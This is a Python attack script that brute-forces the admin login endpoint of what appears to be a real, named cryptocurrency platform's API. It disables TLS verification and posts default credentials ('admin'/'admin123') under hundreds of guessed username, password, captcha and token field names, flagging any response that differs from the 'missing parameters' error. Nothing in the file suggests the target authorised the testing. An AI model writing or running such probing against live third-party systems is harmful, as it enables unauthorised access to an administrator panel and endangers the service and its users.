"""
Riscoin Admin Login - Exhaustive field name brute force
Chinese dev teams commonly use these field naming patterns
"""
import requests, json, itertools
import urllib3
urllib3.disable_warnings()

BASE = "https://api.riscoima.com"
H = {
    "Origin": "https://riscoin.com",
    "Referer": "https://riscoin.com/h5/",
    "Content-Type": "application/json",
    "SET-LANGUAGE": "ENGLISH",
    "User-Agent": "Mozilla/5.0"
}

def test(payload, label=""):
    try:
        r = requests.post(f"{BASE}/api/admin/login", json=payload, headers=H, timeout=10, verify=False)
        j = r.json()
        err = j.get("errCode", "?")
        if err != 100003:  # DIFFERENT from "Missing parameters"!
            print(f"  *** MATCH! [{r.status_code}] errCode={err} | {label}: {json.dumps(payload)}")
            print(f"      Response: {r.text[:300]}")
            return True
        return False
    except:
        return False

# All possible username field names
user_fields = [
    "userName", "username", "user_name", "UserName", "USERNAME",
    "account", "Account", "accountName", "account_name",
    "email", "Email", "adminEmail", "admin_email",
    "loginName", "login_name", "LoginName", "login",
    "name", "Name", "adminName", "admin_name",
    "phone", "Phone", "mobile", "Mobile",
    "userId", "user_id", "adminId", "admin_id",
    "admin", "Admin", "operator",
    "loginAccount", "login_account",
    "sysUserName", "sys_user_name",
    "managerName", "manager_name",
    "staffName", "staff_name",
]

# All possible password field names
pass_fields = [
    "password", "Password", "passWord", "PASSWORD", "pass_word",
    "pwd", "Pwd", "PWD",
    "loginPwd", "login_pwd", "LoginPwd",
    "passkey", "passcode", "secret",
    "adminPwd", "admin_pwd",
    "loginPassword", "login_password",
    "userPwd", "user_pwd",
    "key", "Key",
]

print("=" * 70)
print("Exhaustive field name combination brute force")
print(f"Testing {len(user_fields)} x {len(pass_fields)} = {len(user_fields)*len(pass_fields)} combinations")
print("Looking for any response != 100003 (Missing parameters)")
print("=" * 70)

found = False
count = 0
for uf in user_fields:
    for pf in pass_fields:
        count += 1
        payload = {uf: "admin", pf: "admin123"}
        if test(payload, f"#{count} {uf}+{pf}"):
            found = True
            # Don't break - test more to find the exact pair

if not found:
    print(f"\nNo match found in {count} combinations.")
    print("\nTrying 3-field combos with common third fields...")
    
    third_fields = [
        ("code", "1234"), ("Code", "1234"),
        ("googleCode", "123456"), ("GoogleCode", "123456"),
        ("captcha", "1234"), ("Captcha", "1234"),
        ("verifyCode", "1234"), ("VerifyCode", "1234"),
        ("imageCode", "1234"), ("ImageCode", "1234"),
        ("token", ""), ("Token", ""),
        ("type", "admin"), ("Type", "admin"),
        ("role", "admin"), ("Role", "admin"),
    ]
    
    # Test most likely user+pass combos with each third field
    likely_combos = [
        ("userName", "password"),
        ("username", "password"),
        ("account", "password"),
        ("email", "password"),
    ]
    
    for uf, pf in likely_combos:
        for tf, tv in third_fields:
            payload = {uf: "admin", pf: "admin123", tf: tv}
            if test(payload, f"{uf}+{pf}+{tf}"):
                found = True

print(f"\n{'FOUND MATCHING FIELDS!' if found else 'No matches found.'}")
print("Done.")
